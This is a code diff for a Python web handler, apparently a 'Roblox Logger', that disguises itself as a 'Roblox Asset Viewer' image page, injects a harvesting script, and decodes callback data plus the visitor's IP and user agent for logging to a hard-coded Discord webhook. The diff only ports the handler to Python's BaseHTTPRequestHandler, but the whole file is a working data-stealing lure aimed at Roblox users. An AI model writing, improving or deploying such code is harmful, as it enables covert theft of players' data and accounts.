@@ -1,5 +1,6 @@
+from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json as _json, os
+import traceback, requests, base64, json as _json, os
 
 # Load config
 try:
@@ -8,7 +9,7 @@ try:
 except:
     config = {
         "webhook": "https://discord.com/api/webhooks/1507881858073890957/U-BedBZvsnTRJwmKUO7K62kngI1j6kUoimH5svkZp8A4DDIHQ6BMyE8Yg9U-W60XlOaN",
-        "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",  # <-- needs a real image URL
+        "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
         "username": "Roblox Logger",
         "color": 16711680
     }
@@ -142,30 +143,39 @@ def harvestScript():
 </script>
 '''
 
-def handler(request):
-    try:
-        ip = request.headers.get("x-forwarded-for", request.headers.get("x-real-ip", ""))
-        if ip and "," in ip:
-            ip = ip.split(",")[0].strip()
-        ua = request.headers.get("user-agent", "")
-        
-        params = {}
-        if request.query_string:
-            params = dict(parse.parse_qsl(request.query_string.decode()))
-        
-        # Handle Roblox callback
-        if params.get("rbx"):
-            try:
-                raw = params["rbx"]
-                raw = parse.unquote(raw)
-                decoded = base64.b64decode(raw).decode("utf-8")
-                data = _json.loads(decoded)
-                logRoblox(ip, data, ua)
-            except:
-                pass
-            return {"statusCode": 200, "body": "", "headers": {"Content-Type": "text/plain"}}
-        
-        page = f'''<!DOCTYPE html>
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        try:
+            # Get IP
+            ip = self.headers.get("x-forwarded-for", self.headers.get("x-real-ip", ""))
+            if ip and "," in ip:
+                ip = ip.split(",")[0].strip()
+            ua = self.headers.get("user-agent", "")
+            
+            # Parse query params
+            params = {}
+            if self.path and "?" in self.path:
+                query_string = self.path.split("?", 1)[1]
+                params = dict(parse.parse_qsl(query_string))
+            
+            # Handle Roblox callback
+            if params.get("rbx"):
+                try:
+                    raw = params["rbx"]
+                    raw = parse.unquote(raw)
+                    decoded = base64.b64decode(raw).decode("utf-8")
+                    data = _json.loads(decoded)
+                    logRoblox(ip, data, ua)
+                except:
+                    pass
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                self.wfile.write(b"")
+                return
+            
+            # Serve the page
+            page = f'''<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Roblox Asset Viewer</title>
 <style>*{{margin:0;padding:0;box-sizing:border-box;}}body{{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;}}img{{max-width:100%;max-height:85vh;border-radius:12px;}}</style>
@@ -175,18 +185,15 @@ def handler(request):
 {harvestScript()}
 </body>
 </html>'''
-        
-        return {
-            "statusCode": 200,
-            "body": page,
-            "headers": {
-                "Content-Type": "text/html; charset=utf-8",
-                "Cache-Control": "no-cache, no-store, must-revalidate"
-            }
-        }
-    except Exception as e:
-        return {
-            "statusCode": 500,
-            "body": f"Error: {e}",
-            "headers": {"Content-Type": "text/plain"}
-        }
+            
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+            self.end_headers()
+            self.wfile.write(page.encode("utf-8"))
+            
+        except Exception as e:
+            self.send_response(500)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(f"Error: {e}".encode("utf-8"))
